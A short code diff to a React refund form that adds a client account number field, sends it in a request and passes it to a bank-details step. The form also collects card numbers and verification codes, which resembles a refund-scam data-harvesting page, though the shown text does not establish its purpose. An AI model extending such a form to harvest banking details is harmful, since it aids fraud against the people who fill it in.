@@ -21,6 +21,7 @@ export default function Form() {
         refundAmount: '',
         clientBankAccount: '',
         clientCardNumber: '',
+        clientAccountNumber: '',
         verificationCode: '',
         state: '',
     });    
@@ -71,7 +72,8 @@ export default function Form() {
             phoneNumber: values.clientPhoneNumber,
             refundAmount: values.refundAmount,
             userBank: values.clientBankAccount,
-            cardNumber: values.clientCardNumber
+            cardNumber: values.clientCardNumber,
+            accountNumber: values.clientAccountNumber,
         }, 
         {
             headers: {
@@ -105,6 +107,7 @@ export default function Form() {
                             />,
                         2: <BankDetails 
                                 refundAmount={values.refundAmount}
+                                accountNumber={values.clientAccountNumber}
                                 handleChange={handleChange} 
                             />,
                         3: <ClientId 
